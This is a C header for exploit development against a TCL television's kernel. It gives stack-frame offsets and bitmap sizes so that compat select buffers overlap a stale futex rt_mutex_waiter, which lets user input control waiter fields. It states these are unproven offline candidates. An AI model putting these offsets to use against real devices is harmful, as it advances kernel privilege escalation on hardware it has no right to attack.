#ifndef TCL_V643_COMPAT_SELECT_GEOMETRY_H
#define TCL_V643_COMPAT_SELECT_GEOMETRY_H

/* Exact stock V643 ARM32-compat select geometry recovered from:
 *
 *   __arm64_compat_sys_select  frame 0x10
 *   do_compat_select           frame 0x80
 *   compat_core_sys_select     frame 0x1b0, local bitmap at sp+0x40
 *
 * Relative to SP at entry to the syscall wrapper, the six local fd bitmaps
 * therefore begin at -0x200.  The exact futex and futex_time32 wrappers both
 * use a 0xa0 frame and call the same do_futex implementation; its stale
 * rt_mutex_waiter begins at syscall_sp-0x1d0.  The waiter consequently starts
 * 0x30 bytes into the compat-select bitmap block.
 *
 * nfds=320 produces 40 bytes per bitmap.  The first three bitmaps are copied
 * from userspace (120 bytes total); the following three output bitmaps are
 * zeroed by compat_core_sys_select.  User input controls the waiter through
 * wake_state/prio, while deadline and ww_ctx land in the zeroed output area.
 *
 * These constants describe an offline candidate only.  They do not prove the
 * vulnerable transition, PI walk or write primitive on the television.
 */

#define TCL_V643_COMPAT_SELECT_NFDS              320U
#define TCL_V643_COMPAT_SELECT_SET_BYTES          40U
#define TCL_V643_COMPAT_SELECT_INPUT_BYTES       120U
#define TCL_V643_COMPAT_SELECT_ALL_BYTES         240U

#define TCL_V643_COMPAT_SELECT_WRAPPER_FRAME    0x10
#define TCL_V643_DO_COMPAT_SELECT_FRAME         0x80
#define TCL_V643_COMPAT_CORE_SELECT_FRAME      0x1b0
#define TCL_V643_COMPAT_CORE_BITMAP_OFF         0x40

#define TCL_V643_COMPAT_SELECT_BITMAP_REL      (-0x200)
#define TCL_V643_COMPAT_FUTEX_WAITER_REL       (-0x1d0)
#define TCL_V643_COMPAT_WAITER_IN_BITMAPS        0x30

#endif
